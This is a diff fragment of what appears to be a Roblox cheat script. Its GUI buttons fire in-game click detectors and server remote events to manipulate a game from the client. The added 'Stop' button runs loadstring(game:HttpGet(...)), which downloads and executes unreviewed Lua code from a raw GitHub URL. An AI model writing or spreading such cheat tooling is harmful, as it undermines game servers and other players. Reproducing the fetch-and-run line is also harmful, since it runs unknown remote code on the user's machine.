@@ -153,11 +153,9 @@ game:GetService("ReplicatedStorage"):WaitForChild("RockyShoot"):FireServer()
 
 end)
 
-Section:NewLabel("LabelText")
-
-Section:NewButton(":Rocky", "milk milk milk", function()
-    fireclickdetector(workspace.Lobby.Rocky.ClickDetector)
+Section:NewButton(":Stop", "milk milk milk", function()
+    fireclickdetector(workspace.Lobby.STOP.ClickDetector)
     wait(0.01)
-game:GetService("ReplicatedStorage"):WaitForChild("RockyShoot"):FireServer()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LoserGrape/shuc0wh0fgww/main/stop'))()
 
 end)
